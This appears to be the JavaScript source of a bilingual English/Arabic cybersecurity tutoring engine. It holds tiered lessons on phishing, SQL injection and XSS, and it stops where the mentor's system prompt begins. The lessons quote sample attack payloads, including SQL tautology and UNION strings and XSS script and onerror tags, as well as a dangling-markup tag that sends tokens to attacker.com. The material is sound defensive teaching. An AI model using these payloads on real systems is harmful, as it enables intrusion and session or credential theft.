/**
 * AI Mentor Engine
 * Generates highly context-aware, tactical cybersecurity training responses based on user level
 * Implements Socratic tutoring (SANS/CISSP style) - guides the learner with protocol details and logic
 */

const { getAiClient } = require("./ai/aiProvider");

class AIMentorEngine {
  constructor() {
    this.openai = getAiClient();

    // High-fidelity bilingual local knowledge base
    this.knowledgeBase = {
      phishing: {
        en: {
          beginner: {
            topic: "Phishing Detection & SMTP Basics",
            explanation: "Phishing (MITRE ATT&CK T1566) is an initial access technique utilizing social engineering to bypass technical perimeter controls. Attackers construct deceptive emails, spoof display identities, or hijack SMTP transport parameters to deceive targets into executing payloads or revealing secrets.",
            examples: [
              "Display Name Spoofing: Masking the actual envelope sender in the headers while setting the display name to a trusted executive.",
              "Lookalike Domains: Typosquatting (e.g., 'paypaI.com' using an uppercase 'I' instead of 'l') and IDN homograph attacks using Cyrillic characters.",
              "Deceptive Urgency: Demands for immediate account verification to trigger psychological panic and bypass analytical thinking."
            ],
            prevention: [
              "Always inspect the raw message headers, checking the 'Return-Path' and the sequence of 'Received' IP addresses.",
              "Enable SPF (Sender Policy Framework) to define which mail servers are authorized to send email on behalf of your domain.",
              "Configure DKIM (DomainKeys Identified Mail) to attach a cryptographic signature to outgoing messages, proving domain integrity."
            ],
            hint: "Look at the raw headers. Does the domain in the 'Return-Path' match the brand in the display name? What server actually relayed this message?"
          },
          intermediate: {
            topic: "Spear Phishing & MTA Verification Mechanics",
            explanation: "Spear Phishing involves highly targeted OSINT-driven operations where attackers research victim roles, relationship hierarchies, and active software vendors to build custom lures. Defending against these requires an understanding of Mail Transfer Agent (MTA) headers and cryptographic authentication states.",
            examples: [
              "Business Email Compromise (BEC): High-value wire-transfer requests mimicking internal vendor invoice schemas or executive orders.",
              "HTML Smuggling: Bypassing network security gateways by encoding malicious files inside HTML pages as JavaScript Blobs, which assemble local payloads inside the victim's browser.",
              "Credential Harvester Redirects: Crafting legitimate-looking URLs that utilize open redirect vulnerabilities on reputable sites to forward victims to malicious login portals."
            ],
            prevention: [
              "Enforce strict DMARC (Domain-based Message Authentication, Reporting, and Conformance) policies with 'reject' options.",
              "Implement robust inbound email gateway filters with dynamic attachment sandboxing and link rewrites.",
              "Establish FIDO2/WebAuthn phishing-resistant multi-factor authentication (MFA) to prevent session credential reuse."
            ],
            hint: "Consider the SMTP handshake. If an attacker spoofs an internal email but sends it from an external host, which DNS-based email validation mechanism (SPF, DKIM, or DMARC) will fail first?"
          },
          advanced: {
            topic: "Adversary-in-the-Middle (AITM) & SEG Evasion",
            explanation: "Advanced phishing leverages proxy architectures (like Evilginx or Muraena) to harvest active session tokens in real time, bypassing traditional multi-factor authentication. Securing enterprises against this requires phishing-resistant infrastructure and session validation logic.",
            examples: [
              "AITM Proxy Phishing: Attacker proxies live traffic between the victim and the target service, intercepting username, password, and session cookies.",
              "Spoofing Internal Connectors: Exploiting open relays or misconfigured hybrid cloud/Exchange routing rules to inject unauthenticated email into the corporate flow.",
              "SVG-based Payloads: Obfuscating exploit chains inside dynamic SVG files to bypass Secure Email Gateway (SEG) static signature analysis."
            ],
            prevention: [
              "Mandate Phishing-Resistant MFA (e.g., FIDO2 security keys, Windows Hello for Business).",
              "Enforce conditional access policies that validate device compliance, corporate IP restrictions, and location anomaly checks.",
              "Monitor Active Directory or Identity provider logs for session IP changes or anomalous user agent switches."
            ],
            hint: "An AITM proxy intercepts session cookies. How can you detect session hijacking when the credentials match, but the authentication source IP differs from the active session IP?"
          }
        },
        ar: {
          beginner: {
            topic: "كشف الاصطياد الاحتيالي وأسس بروتوكول SMTP",
            explanation: "الاصطياد الاحتيالي هو أسلوب وصول أولي (MITRE ATT&CK T1566) يعتمد على الهندسة الاجتماعية لتجاوز الدفاعات الفنية. يقوم المهاجمون بصياغة رسائل مخادعة أو تزوير هويات المرسلين لخداع الضحايا ودفعهم لتشغيل برمجيات خبيثة أو كشف كلمات المرور.",
            examples: [
              "تزوير اسم المرسل: تغيير الاسم المعروض ليظهر كجهة موثوقة مع إخفاء عنوان البريد الحقيقي في الترويسة.",
              "النطاقات الشبيهة (Typosquatting): تسجيل نطاقات قريبة جداً إملائياً (مثل استخدام حرف 'I' كبير بدل 'l' في اسم موقع معروف) لخداع العين المجرّدة.",
              "الاستعجال الوهمي: رسائل تدّعي تعليق الحساب لإثارة الذعر ودفع المستخدم لاتخاذ قرارات سريعة دون تفكير."
            ],
            prevention: [
              "تفحص دائماً الترويسة الخام للرسالة (Raw Headers)، ودقق في مسار 'Return-Path' وسلسلة خوادم 'Received'.",
              "تفعيل بروتوكول SPF (إطار سياسة المرسل) لتحديد الخوادم المصرح لها بإرسال رسائل باسم نطاقك.",
              "إعداد توقيع DKIM البرمجي للتأكد من أن الرسالة لم تتعرض للتعديل أثناء انتقالها عبر الشبكة."
            ],
            hint: "انظر إلى ترويسة الرسالة الخام. هل يتطابق نطاق المرسل الحقيقي في 'Return-Path' مع الاسم المعروض في الرسالة؟ أي خادم قام بتمرير هذه الرسالة فعلياً؟"
          },
          intermediate: {
            topic: "الاصطياد الموجه وآليات التحقق من المرسلين",
            explanation: "الاصطياد الموجه (Spear Phishing) هو هجوم مخصص يعتمد على جمع المعلومات العامة (OSINT) حول الضحية وسلسلة العلاقات في المؤسسة. يتطلب صد هذه الهجمات فهماً دقيقاً لترويسة البريد وآليات التوثيق الرقمي.",
            examples: [
              "اختراق البريد التجاري (BEC): رسائل وهمية تطلب تحويلات مالية عاجلة تحاكي فواتير حقيقية أو أوامر إدارة عليا.",
              "تهريب كود HTML (HTML Smuggling): تشفير الملفات الضارة كرموز JavaScript داخل صفحة HTML عادية، ليتم تجميع البرمجية الخبيثة داخل متصفح الضحية متجاوزاً جدران الحماية.",
              "روابط التوجيه المفتوحة: استغلال ثغرات التوجيه في مواقع شهيرة وموثوقة لتوجيه الضحية إلى صفحات تسجيل دخول مزيفة."
            ],
            prevention: [
              "فرض سياسة DMARC صارمة وتعيينها على خيار 'reject' لحظر الرسائل غير الموثقة بالكامل.",
              "استخدام بوابات بريد ذكية توفر فحصاً ديناميكياً للمرفقات في بيئة معزولة (Sandboxing).",
              "اعتماد مصادقة ثنائية مقاومة للاصطياد تعتمد على مفاتيح الأمان FIDO2."
            ],
            hint: "فكر في مصافحة بروتوكول SMTP. إذا قام المهاجم بتزوير رسالة من بريد داخلي لكنه أرسلها من خادم خارجي، أي بروتوكول حماية (SPF أو DKIM أو DMARC) سيفشل أولاً؟"
          },
          advanced: {
            topic: "هجمات وسيط الجلسة (AITM) وتجاوز بوابات البريد",
            explanation: "تعتمد هجمات وسيط الجلسة المتقدمة (Adversary-in-the-Middle) على خوادم وكيلة (Proxies مثل Evilginx) لاعتراض الجلسة وملفات الارتباط (Cookies) فورياً، مما يسمح بتجاوز المصادقة الثنائية التقليدية.",
            examples: [
              "وسيط جلسة Evilginx: يقوم خادم المهاجم بطلب البيانات وتمريرها بين الضحية والموقع الحقيقي، مع اعتراض الجلسة وسحب ملفات التعريف.",
              "استغلال الممر الداخلي المفتوح: حقن رسائل غير موثقة عبر خوادم SMTP داخلية غير محمية أو مهيأة بشكل خاطئ.",
              "المرفقات التفاعلية المشفرة: استخدام ملفات رسومية مثل SVG لإخفاء أكواد التشغيل البرمجية وتجاوز الفحص التقليدي لبوابات البريد (SEG)."
            ],
            prevention: [
              "فرض المصادقة المقاومة للاصطياد بشكل إلزامي (مثل Windows Hello أو مفاتيح YubiKey).",
              "تطبيق سياسات الوصول المشروط (Conditional Access) للتحقق من سلامة الجهاز، ونطاق الـ IP الجغرافي.",
              "مراقبة سجلات خوادم الهوية للتحقق من تغير الـ IP المفاجئ لنفس الجلسة النشطة."
            ],
            hint: "خادم AITM يعترض ملفات الجلسة (Cookies). كيف يمكن لمهندس الأمن كشف سرقة الجلسة عندما تكون كلمات المرور صحيحة لكن عنوان الـ IP الفعلي يختلف فجأة عن الـ IP الذي أجرى المصادقة؟"
          }
        }
      },
      "sql injection": {
        en: {
          beginner: {
            topic: "SQL Injection & Lexical Boundary Concepts",
            explanation: "SQL Injection (SQLi) occurs when an application takes untrusted user input and concatenates it directly into a dynamic database query string. This allows the input to break out of the data context and enter the command execution context, manipulating the query syntax tree.",
            examples: [
              "Tautology Bypass: Inputting `' OR '1'='1` in a login field to force the query to evaluate to true, bypassing credentials checking.",
              "Inline Comments: Inputting `' --` to truncate the rest of the developer's intended SQL query, neutralizing database validation constraints.",
              "Error Forcing: Sending an unbalanced single quote `'` to trigger verbose SQL server syntax warnings, revealing system path structures."
            ],
            prevention: [
              "Always use Parameterized Queries (Prepared Statements). This binds parameters strictly as literal data, preventing DBMS parser execution.",
              "Implement context-aware server-side input sanitation and white-list validation patterns.",
              "Restrict database user privileges to the absolute minimum needed (Least Privilege)."
            ],
            hint: "Consider the boundary between commands and data. If a SQL statement is compiled before the user input is inserted, can the input change the query's structure?"
          },
          intermediate: {
            topic: "UNION-Based Extraction & Blind Testing",
            explanation: "Intermediate SQLi involves active database schema enumeration and data extraction. Attackers leverage UNION operator mechanics or side-channel responses (Boolean/Time) to extract unauthorized tables and database metadata.",
            examples: [
              "UNION-Based Injection: Appending `UNION SELECT null, username, password FROM users --` to merge unauthorized table rows into the active UI render.",
              "Boolean-Based Blind: Sending payloads that alter the server's boolean response (True/False pages) to extract data character-by-character.",
              "Time-Based Blind: Forcing the database engine to execute high-resource loops or sleep functions (`pg_sleep(5)`) to infer character matches based on response delays."
            ],
            prevention: [
              "Enforce Prepared Statements across all ORMs and dynamic data query engines.",
              "Implement robust application-level error catching; never display raw database error logs to users.",
              "Use Web Application Firewalls (WAF) to block SQL character patterns, but remember a WAF is a shield, not a code-level fix."
            ],
            hint: "When performing a UNION injection, the injected query must return the exact same number of columns and compatible data types as the primary query. How do you find the correct column count?"
          },
          advanced: {
            topic: "Second-Order Exploits & Out-of-Band Exfiltration",
            explanation: "Advanced SQLi targets complex application logic. Second-order vulnerabilities occur when input is safely stored in a database but executed insecurely when retrieved later. Out-of-band (OOB) exfiltration uses database features to trigger external DNS/HTTP requests to bypass restricted return channels.",
            examples: [
              "Second-Order SQLi: Registering a user named `admin' --`; when the profile updating query runs later, it truncates administrative settings.",
              "DNS Out-of-Band (DNS Tunneling): Using SQL functions like `LOAD_FILE()` in MySQL or standard XP commands in MSSQL to trigger external DNS queries containing extracted data.",
              "WAF Evasion via Encoding: Evading signature filters using double URL encoding, hex representation, or custom SQL functions (e.g., `CHAR(115, 113, 108)`)."
            ],
            prevention: [
              "Treat all internal database retrieval actions as untrusted input. Apply sanitization at both store and retrieve stages.",
              "Limit the database's outbound network capabilities (e.g., block DNS/HTTP requests originating from the DB subnet).",
              "Conduct static and dynamic code analysis (SAST/DAST) focusing on data persistence layers."
            ],
            hint: "Second-order SQLi does not exploit the application immediately upon submission. Why is static code analysis often more effective than dynamic scanning in identifying second-order injection points?"
          }
        },
        ar: {
          beginner: {
            topic: "ثغرات حقن SQL ومفهوم الحدود البرمجية للبيانات",
            explanation: "تحدث ثغرة حقن استعلامات قاعدة البيانات (SQL Injection) عندما يأخذ التطبيق مدخلات غير موثوقة من المستخدم ويقوم بدمجها مباشرة في نص استعلام ديناميكي. يسمح هذا للمدخلات بالخروج من سياق البيانات والدخول في سياق الأوامر لتغيير بنية الاستعلام.",
            examples: [
              "تجاوز شاشات الدخول: إدخال رمز `' OR '1'='1` في حقول تسجيل الدخول لإجبار الاستعلام على التحقق بشكل صحيح دون الحاجة للبيانات الفعلية.",
              "التعليقات البرمجية المدمجة: إدخال رمز `' --` لإلغاء وتجاهل بقية الاستعلام البرمجي المكتوب من قبل المطور وتخطي القيود.",
              "تحفيز إظهار الأخطاء: إرسال علامة اقتباس مفردة `'` لإجبار خادم قاعدة البيانات على عرض تفاصيل الخطأ وبنية الجداول الهيكلية."
            ],
            prevention: [
              "استخدام الاستعلامات المعلمية (Prepared Statements) دائماً لربط مدخلات المستخدم كبيانات نصية فقط دون السماح للـ DBMS بتفسيرها ككود.",
              "تطبيق التحقق الدقيق وتطهير المدخلات على الخادم وفق قوائم برمجية بيضاء موثوقة.",
              "تطبيق مبدأ الصلاحيات الأقل (Least Privilege) على حساب الاتصال بقاعدة البيانات وحظر الصلاحيات الإدارية."
            ],
            hint: "فكر في الحد الفاصل بين الأوامر والبيانات. إذا تم تجميع وتفسير استعلام SQL قبل إدخال بيانات المستخدم فيه، فهل يمكن لبيانات المستخدم تغيير هيكل الاستعلام؟"
          },
          intermediate: {
            topic: "استخراج البيانات عبر UNION والحقن الأعمى",
            explanation: "يشتمل حقن SQL المتوسط على استكشاف هيكل الجداول واستخراج البيانات الحساسة. يستغل المهاجمون عوامل مثل UNION أو يستعينون بالقنوات الجانبية (مثل الزمن والمنطق الثنائي) لقراءة الجداول المحمية.",
            examples: [
              "الحقن المعتمد على UNION: إضافة عبارة `UNION SELECT null, username, password FROM users --` لدمج صفوف الجداول المسروقة مع البيانات المعروضة في الصفحة.",
              "الحقن الثنائي الأعمى (Boolean Blind): إرسال مدخلات تعدل من منطق الصفحة (صح أو خطأ) لاستنتاج البيانات حرفاً بحرف بناءً على محتوى الصفحة المستردة.",
              "الحقن الأعمى المعتمد على الوقت (Time Blind): إجبار خادم قاعدة البيانات على النوم أو التعليق (`pg_sleep(5)`) لاستنتاج الحروف بناءً على تأخر استجابة الخادم."
            ],
            prevention: [
              "الاعتماد الكامل على الأطر البرمجية (ORMs) الآمنة التي تمنع الاستعلامات الديناميكية تلقائياً.",
              "حظر إظهار تفاصيل الأخطاء للمستخدمين؛ قم بالتقاط الأخطاء وتخزينها داخلياً فقط دون تسريب تفاصيل المحرك.",
              "استخدام جدران حماية تطبيقات الويب (WAF) لتصفية المدخلات، مع الحفاظ على إصلاح الكود الأساسي كحل جذري."
            ],
            hint: "عند استخدام استعلام UNION، يجب أن يتطابق الاستعلام المحقون مع الاستعلام الأصلي في عدد الأعمدة ونوع البيانات. كيف يمكنك معرفة عدد الأعمدة الصحيح؟"
          },
          advanced: {
            topic: "الحقن من الدرجة الثانية واستخراج البيانات خارج النطاق",
            explanation: "يستهدف حقن SQL المتقدم منطق العمليات المعقدة. تحدث ثغرات الدرجة الثانية (Second-Order SQLi) عندما يتم حفظ المدخلات بأمان في قاعدة البيانات كبيانات غير ضارة، ولكن يتم استدعاؤها لاحقاً بشكل غير آمن داخل استعلام آخر. أما الحقن خارج النطاق (OOB) فيستخدم ميزات قاعدة البيانات لإرسال طلبات خارجية (DNS/HTTP).",
            examples: [
              "الحقن من الدرجة الثانية: تسجيل مستخدم باسم `admin' --`؛ عندما يقوم التطبيق لاحقاً بتحديث إعدادات هذا الحساب عبر استعلام آخر، فإنه يقوم بإلغاء بقية الاستعلام وتعديل حساب المسؤول الحقيقي.",
              "استخراج البيانات عبر DNS (DNS Tunneling): استخدام دوال برمجية مثل `LOAD_FILE()` أو استدعاء خوادم ملفات خارجية لإجبار خادم قاعدة البيانات على إرسال طلبات DNS تحتوي على البيانات المشفرة.",
              "تجاوز جدران الحماية عبر التشفير: استخدام الترميز الثنائي أو Hex لتجاوز الكلمات المحظورة لدى الـ WAF (مثل تحويل النصوص إلى دالة `CHAR(115, 113, 108)`)."
            ],
            prevention: [
              "معاملة البيانات المستردة من قاعدة البيانات كبيانات غير موثوقة تماماً مثل مدخلات المستخدم وتطهيرها قبل معالجتها في استعلامات جديدة.",
              "تقييد الاتصالات الخارجية لخادم قاعدة البيانات لمنعه من إرسال طلبات DNS أو HTTP خارج شبكته الخاصة.",
              "إجراء اختبارات فحص الكود المصدرية (SAST) بشكل دوري لمراجعة مسار البيانات بداخل الكود."
            ],
            hint: "الحقن من الدرجة الثانية لا يعطي استجابة فورية عند الإدخال. لماذا يعتبر فحص الكود الثابت (Static Analysis) أكثر فعالية من الفحص الديناميكي (Dynamic Scanning) في كشف هذه الثغرة؟"
          }
        }
      },
      xss: {
        en: {
          beginner: {
            topic: "Cross-Site Scripting & Client-Side Execution",
            explanation: "Cross-Site Scripting (XSS) arises when an application includes untrusted user input within a web page sent to a browser without context-appropriate encoding. The browser interprets the text as executable JavaScript, running code within the security context of the victim's session.",
            examples: [
              "Reflected XSS: A search parameter `?q=<script>alert(1)</script>` is dynamically echoed in the server response page, triggering immediate execution.",
              "Stored XSS: A user comment containing a malicious payload is saved to the server and executes in the browser of every visitor who loads that thread.",
              "DOM-based XSS: Client-side JavaScript reads user input from a source (like `window.location.hash`) and writes it insecurely into a sink (like `element.innerHTML`)."
            ],
            prevention: [
              "Apply strict context-aware output encoding (HTML body, attributes, CSS, JavaScript contexts).",
              "Utilize robust HTML sanitization libraries (such as DOMPurify) before injecting HTML blocks.",
              "Enforce the `HttpOnly` flag on sensitive session cookies to prevent client-side JavaScript access."
            ],
            hint: "Think about how a browser parses a web page. If the browser sees `<script>`, how does it know whether that tag was written by the server developer or injected by a user?"
          },
          intermediate: {
            topic: "DOM Sinks & Content Security Policy",
            explanation: "Intermediate XSS involves manipulating client-side execution contexts and bypassing basic filter rules. Defenders must distinguish between sources (where input enters) and sinks (where input is executed) and deploy strong browser-level defense in depth.",
            examples: [
              "DOM Source to Sink: Exploiting dynamic routing frameworks where values are passed to dangerous functions like `eval()`, `setTimeout()`, or `document.write()`.",
              "Filter Bypass via Event Handlers: Evading simple string filters blocking `<script>` by utilizing HTML tags with intrinsic triggers (e.g., `<img src=x onerror=alert(1)>`).",
              "Session Hijacking payloads: Using fetch or XMLHttpRequest to exfiltrate cookies (`document.cookie`) to an attacker-controlled listener endpoint."
            ],
            prevention: [
              "Deploy a strict Content Security Policy (CSP) restricting script sources and forbidding inline script execution (`unsafe-inline`).",
              "Use secure JavaScript APIs (such as `element.textContent` instead of `element.innerHTML`) to automatically enforce safe encoding.",
              "Configure cookie attributes with `SameSite=Strict` and `Secure` to reduce session abuse vectors."
            ],
            hint: "If a developer blocks the word 'script', an attacker can still trigger JavaScript using HTML attributes. What element attribute triggers code execution when a resource fails to load?"
          },
          advanced: {
            topic: "CSP Evasion & Framework-Specific Sinks",
            explanation: "Advanced XSS focuses on bypassing modern browser security structures (like restrictive CSP rules) and exploiting parsing quirks in client-side framework templates (React, Angular) or trusted third-party resources.",
            examples: [
              "CSP Bypass via JSONP Endpoints: Triggering execution by sourcing scripts from whitelisted domains that expose open JSONP API endpoints.",
              "React/Angular Template Injection: Exploiting client-side template engines by injecting syntax expressions (e.g., `{{constructor.constructor('alert(1)')()}}`) inside unescaped inputs.",
              "Dangling Markup Attacks: Injecting unfinished HTML tags (e.g., `<img src='http://attacker.com/log?c=`) to steal surrounding session tokens or CSRF tokens in subsequent content."
            ],
            prevention: [
              "Implement strict nonce-based or hash-based CSP rules rather than trusting broad domain whitelists.",
              "Configure robust CSRF protections (Anti-CSRF tokens) and ensure administrative endpoints validate CORS configurations strictly.",
              "Conduct rigorous client-side security testing and dependency analysis to prevent prototype pollution vulnerabilities."
            ],
            hint: "A nonce-based CSP requires a unique cryptographically random token on every `<script>` tag. If an attacker finds a Stored XSS, how can they bypass this restriction without knowing the current session's nonce?"
          }
        },
        ar: {
          beginner: {
            topic: "ثغرات حقن النص البرمجي XSS وتنفيذ كود العميل",
            explanation: "تنشأ ثغرات نص الموقع المشترك (Cross-Site Scripting) عندما يقوم موقع الويب بدمج مدخلات غير آمنة في الصفحة المرسلة إلى متصفح الضحية دون ترميزها. يقوم المتصفح بتفسير النص كأمر برمجيات JavaScript، ويشغل الكود داخل سياق أمان جلسة المستخدم.",
            examples: [
              "الحقن المنعكس (Reflected XSS): إرسال رابط يحتوي على كود ضار مثل `?q=<script>alert(1)</script>` ليقوم السيرفر بعرضه فوراً في الصفحة، مما يطلق الكود بمجرد فتح الرابط.",
              "الحقن المخزن (Stored XSS): حفظ الكود الضار داخل قاعدة البيانات (مثل حقل تعليقات المنتدى) ليتم تشغيله تلقائياً في متصفح كل مستخدم يزور هذه الصفحة.",
              "الحقن المعتمد على الـ DOM: قراءة مدخلات المستخدم عبر أكواد جافاسكريبت مباشرة من الرابط (`window.location.hash`) وكتابتها بشكل غير آمن داخل الصفحة عبر دوال مثل `innerHTML`."
            ],
            prevention: [
              "استخدام الترميز المعتمد على السياق (Context-Aware Encoding) (ترميز النصوص، ترميز حقول الخصائص، ترميز نصوص جافاسكريبت).",
              "استخدام مكتبات تطهير نصوص الـ HTML الموثوقة (مثل DOMPurify) قبل إدراج أي كود HTML ديناميكي.",
              "تفعيل خاصية `HttpOnly` لملفات تعريف الجلسة (Cookies) لمنع وصول جافاسكريبت إليها من جهة العميل."
            ],
            hint: "فكر في كيفية تحليل المتصفح لصفحات الويب. إذا رأى المتصفح وسم `<script>`، فكيف يمكنه التمييز بين الكود الأصلي للموقع والكود الذي حقنه مستخدم غريب؟"
          },
          intermediate: {
            topic: "ثغرات الـ DOM وجدران حماية المحتوى CSP",
            explanation: "تشتمل ثغرات XSS المتوسطة على التعامل الذكي مع سياقات تشغيل الـ DOM وتخطي الفلاتر البسيطة. يجب على مهندسي الأمن معرفة المصادر والمصبات (Sinks) وتطبيق سياسات حماية صارمة على المتصفح.",
            examples: [
              "استغلال مصبات الـ DOM: تمرير مدخلات المستخدم إلى دوال تشغيل خطيرة مباشرة مثل `eval()` أو `document.write()` أو `setTimeout()`.",
              "تجاوز الفلاتر عبر خصائص الأحداث (Event Handlers): تجاوز الفلاتر التي تحظر كلمة `script` عن طريق استغلال أحداث الصور والوسوم الأخرى (مثل `<img src=x onerror=alert(1)>`).",
              "سرقة الجلسات النشطة: استخدام دوال `fetch` أو `XMLHttpRequest` لإرسال ملفات تعريف الجلسة (`document.cookie`) إلى خوادم المهاجم الخارجية."
            ],
            prevention: [
              "تطبيق سياسة أمان محتوى صارمة (Content Security Policy) تمنع تشغيل الأكواد المضمنة وتحدد مصادر السكربتات المسموح بها.",
              "استخدام خصائص آمنة برمجياً مثل `textContent` أو `innerText` بدلاً من `innerHTML` لتقوم الأجهزة بترميز المدخلات تلقائياً.",
              "تفعيل سمات الحماية لملفات الارتباط مثل `SameSite=Strict` و `Secure` لمنع هجمات الاستغلال."
            ],
            hint: "إذا قام المطور بحظر كلمة 'script'، فكيف يمكن للمهاجم تشغيل كود جافاسكريبت باستخدام خصائص الأخطاء المدمجة في وسوم الصور؟"
          },
          advanced: {
            topic: "تجاوز الـ CSP وثغرات أطر العمل البرمجية",
            explanation: "يستهدف حقن XSS المتقدم تجاوز هياكل الأمان الحديثة (مثل قيود سياسة CSP المعقدة) واستغلال خصائص المعالجة في قوالب أطر العمل الحديثة (React أو Angular) أو الخدمات الخارجية الموثوقة.",
            examples: [
              "تجاوز الـ CSP عبر نقاط JSONP المفتوحة: استدعاء ملفات جافاسكريبت من خوادم موثوقة ومسموح بها لدى الـ CSP ولكنها تعرض نقاط واجهة برمجة (APIs) تدعم استدعاءات JSONP.",
              "حقن قوالب العميل (Template Injection): استغلال أطر العمل التي تحلل النصوص ديناميكياً وحقن عمليات رياضية أو منطقية لتجاوز الحماية (مثل `{{constructor.constructor('alert(1)')()}}`).",
              "هجمات العلامات المفتوحة (Dangling Markup): حقن وسوم غير مكتملة (مثل `<img src='http://attacker.com/log?c=`) لإجبار المتصفح على إرسال كل النصوص والرموز التالية لها كمعامل خروج."
            ],
            prevention: [
              "اعتماد سياسات CSP قائمة على استخدام الرموز العشوائية لمرة واحدة (Nonces) أو بصمات الملفات (Hashes) بدلاً من الوثوق بنطاقات كاملة.",
              "إعداد وتطبيق آليات مكافحة التزوير (Anti-CSRF Tokens) والتحقق الدقيق من تهيئة الـ CORS على الخادم.",
              "إجراء مراجعات برمجية دقيقة للتحقق من سلامة الأكواد ومنع ثغرات تلوث النموذج الأولي (Prototype Pollution)."
            ],
            hint: "تتطلب سياسة الـ CSP القائمة على الـ Nonce وجود رمز تشفيري عشوائي فريد لكل وسم `<script>`. إذا وجد المهاجم ثغرة XSS مخزنة، فكيف يمكنه تجاوز هذا القيد دون معرفة الرمز الحالي؟"
          }
        }
      }
    };
  }

  /**
   * Map numeric user level to difficulty band
   */
  mapUserLevelToDifficulty(userLevel = 1) {
    const level = Number(userLevel) || 1;
    if (level <= 1) return "beginner";
    if (level <= 3) return "intermediate";
    return "advanced";
  }

  /**
   * Detect Arabic character presence to toggle language response mode
   */
  detectLanguage(text = "") {
    return /[\u0600-\u06FF]/.test(text) ? "ar" : "en";
  }

  /**
   * Normalize AI output to a safe, strict schema
   */
  normalizeResponse(resp = {}, fallbackTopic = "", fallbackDifficulty = "beginner") {
    return {
      explanation:
        typeof resp.explanation === "string" && resp.explanation.trim()
          ? resp.explanation.trim()
          : "I could not generate a full explanation for this topic yet.",
      examples: Array.isArray(resp.examples)
        ? resp.examples.filter((x) => typeof x === "string" && x.trim()).slice(0, 6)
        : [],
      prevention: Array.isArray(resp.prevention)
        ? resp.prevention.filter((x) => typeof x === "string" && x.trim()).slice(0, 6)
        : [],
      hint:
        typeof resp.hint === "string"
          ? resp.hint.trim()
          : "",
      topic:
        typeof resp.topic === "string" && resp.topic.trim()
          ? resp.topic.trim()
          : fallbackTopic,
      difficulty:
        typeof resp.difficulty === "string" && resp.difficulty.trim()
          ? resp.difficulty.trim().toLowerCase()
          : fallbackDifficulty
    };
  }

  /**
   * Try to extract JSON from model output
   */
  extractJsonFromText(text) {
    if (!text || typeof text !== "string") return null;

    const trimmed = text.trim();

    try {
      return JSON.parse(trimmed);
    } catch (_) {
      // continue
    }

    const start = trimmed.indexOf("{");
    const end = trimmed.lastIndexOf("}");

    if (start !== -1 && end !== -1 && end > start) {
      const maybeJson = trimmed.slice(start, end + 1);
      try {
        return JSON.parse(maybeJson);
      } catch (_) {
        return null;
      }
    }

    return null;
  }

  /**
   * Find topic from local knowledge base
   */
  detectTopic(question = "") {
    const lower = String(question).toLowerCase();

    const topics = Object.keys(this.knowledgeBase).sort(
      (a, b) => b.length - a.length
    );

    for (const topic of topics) {
      if (lower.includes(topic.toLowerCase()) || 
          (topic === "phishing" && (lower.includes("احتيال") || lower.includes("اصطياد"))) ||
          (topic === "sql injection" && (lower.includes("حقن") || lower.includes("استعلام"))) ||
          (topic === "xss" && (lower.includes("حقن نص") || lower.includes("cross")))) {
        return topic;
      }
    }

    return "";
  }

  /**
   * Fallback to local knowledge base
   */
  getKnowledgeBaseResponse(question, userLevel = 1) {
    const lang = this.detectLanguage(question);
    const topic = this.detectTopic(question) || "phishing"; // default to phishing if unknown
    const difficulty = this.mapUserLevelToDifficulty(userLevel);

    const levels = this.knowledgeBase[topic]?.[lang] || this.knowledgeBase[topic]?.en;
    if (levels) {
      const base = levels[difficulty] || levels.beginner;
      return this.normalizeResponse(
        {
          ...base,
          topic: base.topic || topic,
          difficulty
        },
        topic,
        difficulty
      );
    }

    // Default fallback if absolutely no topic match
    if (lang === "ar") {
      return this.normalizeResponse(
        {
          explanation: "أنا هنا كمرشد سيبراني تكتيكي لمساعدتك. لم أتعرف على موضوعك بدقة، ولكن لحل أي مسألة أمنية، يرجى التفكير في ثلاثة ركائز: ما هو المسار البرمجي المهدد؟ وكيف يمكن للمهاجم التلاعب بالمدخلات لتجاوز الحدود؟ وكيف يمكننا فرض فصل تام بين الأوامر والبيانات؟",
          examples: [
            "تحديد نقطة الدخول والتحقق من صحة المدخلات.",
            "مراقبة استجابة النظام وفهم الثغرة.",
            "البحث عن حل جذري (مثل المعالجة المجهزة مسبقاً)."
          ],
          prevention: [
            "تطبيق مبدأ الثقة المعدومة (Zero Trust).",
            "عزل النظم الحساسة وصيانة التحديثات بانتظام.",
            "بناء دفاعات متعددة الطبقات (Defense in Depth)."
          ],
          hint: "حاول صياغة سؤالك حول أحد المواضيع السيبرانية الأساسية: مثل الاصطياد الاحتيالي، أو حقن استعلامات SQL، أو ثغرات XSS، وسأقوم بتحليلها لك بالتفصيل.",
          topic: "أصول الدفاع السيبراني التكتيكي",
          difficulty
        },
        "",
        difficulty
      );
    }

    return this.normalizeResponse(
      {
        explanation: "As your tactical cybersecurity mentor, I encourage you to break this technical challenge down. To address any vulnerability, evaluate: What is the code execution boundary? How does the input contaminate the logic structure? How can we enforce strict parameterization to decouple commands from data?",
        examples: [
          "Identify the data input vector and sanitization pathways.",
          "Inspect how system logs reflect anomalous behaviors.",
          "Determine the root mitigation pattern (e.g., Prepared Statements or CSP)."
        ],
        prevention: [
          "Adopt a rigorous Zero Trust model.",
          "Harden configurations and reduce attack surfaces.",
          "Implement layered Defense in Depth architecture."
        ],
        hint: "Try asking about specific cyber operations domains: phishing, SQL injection, XSS, or network discovery commands (nmap) to unlock Socratic tactical guidance.",
        topic: "Foundational Cyber Defense Principles",
        difficulty
      },
      "",
      difficulty
    );
  }

  /**
   * Ask the AI mentor a question.
   * @param {string} question
   * @param {number} userLevel
   * @param {string} context
   */
  async generateResponse(question, userLevel = 1, context = "general") {
    const cleanQuestion = typeof question === "string" ? question.trim().slice(0, 3000) : "";
    const cleanContext = typeof context === "string" ? context.trim().slice(0, 100) : "general";
    const difficulty = this.mapUserLevelToDifficulty(userLevel);
    const fallbackTopic = this.detectTopic(cleanQuestion);
    const lang = this.detectLanguage(cleanQuestion);

    if (!cleanQuestion) {
      return this.normalizeResponse(
        {
          explanation: lang === "ar" ? "يرجى كتابة سؤال أمن سيبراني محدد لمساعدتك تكتيكياً." : "Please specify a distinct cybersecurity threat question so I can assist you tactically.",
          examples: [],
          prevention: [],
          hint: lang === "ar" ? "جرب السؤال عن تفاصيل ترويسة البريد الإلكتروني، أو آليات عملPrepared Statements، أو تفادي ثغرات XSS." : "Try asking about raw SMTP headers, Prepared Statement compilation, or context-aware XSS mitigations.",
          topic: "",
          difficulty
        },
        "",
        difficulty
      );
    }

    if (this.openai) {
      try {
        const systemPrompt = `
You are Raqeem AI Mentor (رقيم), a highly rigorous SANS-certified cybersecurity instructor and Incident Commander.
